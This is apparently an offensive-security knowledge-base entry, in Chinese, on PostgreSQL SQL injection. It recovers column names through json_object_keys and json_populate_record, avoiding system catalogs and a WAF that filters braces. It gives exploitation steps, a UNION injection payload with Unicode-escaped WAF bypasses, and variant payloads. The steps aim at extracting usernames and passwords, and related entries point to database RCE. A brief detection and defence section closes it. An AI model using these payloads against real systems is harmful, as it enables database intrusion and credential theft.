---
id: web-generic-sqli-postgres-json-column-enum
title: PostgreSQL 注入无 information_schema 取列名：json_object_keys + json_populate_record
type: scenario
domain: web
path: web/generic/sqli
technique: postgres-json-populate-record-column-enum
tags:
- web
- sqli
- postgresql
- column-enumeration
- json
- waf-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V213
  verified_at: '2026-11-07T04:26:59+08:00'
  notes: 已对照原文与 img/07、08 核对：pg_tables 枚举、json_object_keys/json_populate_record/json_build_object 列名推导、users 返回 id 到 deleted_at 的列名列表与最终 payload 一致；保留。
url: /docs/web/generic/sqli/web-generic-sqli-postgres-json-column-enum/
draft: false
kb_aliases:
- PostgreSQL 取列名
- json_object_keys
- json_populate_record
- 不查 information_schema
- hstore 取列名
- WAF 过滤花括号绕过
---

## 一句话结论

当 PostgreSQL 注入点被 WAF 拦截 `information_schema`/`pg_attribute` 等系统表且过滤 `{}` 时，可以用 `json_object_keys(to_json(json_populate_record(null::t_user, json_build_object())))` 直接由表的行类型推导出全部列名：不查系统表、payload 里不出现字面量花括号，短小且容易塞进 UNION 注入。

## 原理

- `json_populate_record(null::t_user, json_build_object())`：把一个“空 JSON 对象”填充到 `t_user` 表的行类型中，得到一个所有列均为 NULL 的 record。这个 record 的结构完全来自表的类型定义，而不是系统表查询。
- `to_json(...)` 把这个 record 转成 JSON 对象，对象的 key 就是列名；`json_object_keys(...)` 再把每个 key 展开成一行。于是 `SELECT json_object_keys(...)` 的结果集就是列名列表。
- `json_build_object()` 在运行时生成 `{}`，payload 文本中不会出现 `{` 和 `}` 字面量，因此绕过了“`{}` 前后同时出现任意字符就拦截”的 WAF 规则。
- 该方法不依赖 `information_schema.columns`、`pg_attribute`、`pg_class` 等系统目录，适合 WAF 对系统表关键字查得严、而 UNION 注入仍可用的场景。
- 文章在本地和线上均验证：`select json_object_keys(to_json(json_populate_record(null::users,json_build_object())))` 返回 `id, username, password, email, nickname, avatar, phone, status, last_login_time, last_login_ip, created_at, updated_at, deleted_at`。

## 触发条件

- 后端为 PostgreSQL，且注入点支持 UNION 或可执行子查询的 SELECT 位置。
- 已知目标表名（可先用 `pg_tables` 枚举），或能从业务语义推断表名。
- WAF 拦截 `information_schema`/`pg_attribute` 等系统表关键字，并过滤 `{}`；但允许 JSON 函数、`::` 类型转换和 `null`。
- UNION 的列数已对齐（可用 `order by` 或报错确定）。

## 利用步骤

1. 确认 PostgreSQL：用 `current_database()`、`version()` 或函数存在性判断；若版本关键字被拦，改用 `current_database()` 等短函数。
2. 枚举表名：`SELECT tablename FROM pg_tables WHERE schemaname NOT IN ('information_schema','pg_catalog')`，按 WAF 规则做注释/转义处理。
3. 选定目标表（文章为 `t_user`），把列名推导函数放进 UNION 的第一个回显列，其余列用常量补齐。
4. 提交 payload，读取返回的每一行列名；若 `{}` 被拦，用 `json_build_object()` 生成空对象。
5. 根据列名构造数据查询（如 `username,password,email`），继续外带数据。

## PoC

核心 SQL（本地验证）：

```sql
SELECT json_object_keys(
  to_json(
    json_populate_record(null::t_user, json_build_object())
  )
);
```

文章最终使用的 JSON 注入 payload（含 WAF 绕过编码）：

```json
{"shareType":"4 union/*\u0022*/\u0073elect json_object_keys(to_json(json_populate_record(null::t_user,json_build_object()))),'\\' -- "}
```

返回结果（列名逐行）：

```text
id
username
password
email
nickname
avatar
phone
status
last_login_time
last_login_ip
created_at
updated_at
deleted_at
```

## 变体与关联

- 变体：`SELECT skeys(hstore(null::t_user))`，利用 hstore 扩展把空记录转成键值对；需要目标启用 hstore。
- 变体：`SELECT key FROM json_each_text(row_to_json((SELECT (null::t_user).*)))`，用 `row_to_json` + `json_each_text` 展开。
- 变体：用 `chr(123)||chr(125)`、`concat(chr(123),chr(125))` 或 `format()` 生成 `{}`，绕过对花括号字面量的过滤。
- 关联：[[web-generic-sqli-postgres-waf-comment-quote-bypass]]（同一注入点的 WAF 注释/Unicode 绕过）。
- 关联：[[web-generic-sqli-postgres-copy-to-program-rce]]、[[web-generic-sqli-postgresql-lo-import-file-read-write]]（拿到列名/数据后的 PostgreSQL 高危利用）。
- 边界：目标表名未知、UNION 列数无法对齐、WAF 直接拦截 JSON 函数或 `::` 类型转换、数据库账号无权访问该表时，该方法不成立。

## 检测与防御

- 检测：SQL 中出现 `json_object_keys`、`json_populate_record`、`json_build_object`、`hstore(`、`row_to_json` 等组合；请求体中出现 `/*...*/` 注释夹在关键字中、Unicode 转义引号/字母。
- 防御：使用参数化查询/预编译语句，禁止用户输入拼接 SQL；数值参数强制类型转换。
- 加固：WAF 在 JSON 解码后按 SQL 词法分析，而不是正则匹配原始字符串；数据库账号最小权限；对 `information_schema`、`pg_catalog` 与 JSON 元数据函数的异常访问告警。
